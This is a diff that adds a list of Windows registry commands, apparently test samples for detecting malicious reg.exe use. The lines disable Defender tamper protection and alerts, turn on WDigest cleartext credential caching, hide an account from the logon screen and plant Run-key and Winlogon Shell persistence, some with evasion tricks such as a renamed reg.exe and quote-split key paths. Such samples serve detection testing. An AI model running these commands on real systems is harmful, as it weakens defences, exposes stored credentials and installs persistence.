@@ -1,0 +1,17 @@
+reg  query "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell"
+reg  query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell"
+reg  query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify"
+reg  query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit"
+reg  add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d 0 /f
+reg  add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration" /v Notification_Suppress /t REG_DWORD /d 1 /f
+reg  add HKCU\Software\AppDataLow\Software\Microsoft\3A861D62-51E0-15700F2219A4 /v comsxRes /t REG_BINARY  /d 72656463616e617279 /f
+reg  add HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f
+reg  add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+reg  add HKLM64\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f
+REG  ADD "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v AtomicOperator$ /t REG_DWORD /d 0
+copy reg.exe not_reg.exe && not_reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 1
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\"WDi""gest" /v UseLogonCredential /t REG_DWORD /d 1
+reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Malicious" /t REG_SZ /d "payload.exe" /f
+copy reg.exe not_reg.exe && not_reg.exe add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe,malicious.exe"
+reg  add "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /v Shell /t REG_SZ /d "malware.exe"
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon""" /v Shell /t REG_SZ /d "malware.exe"
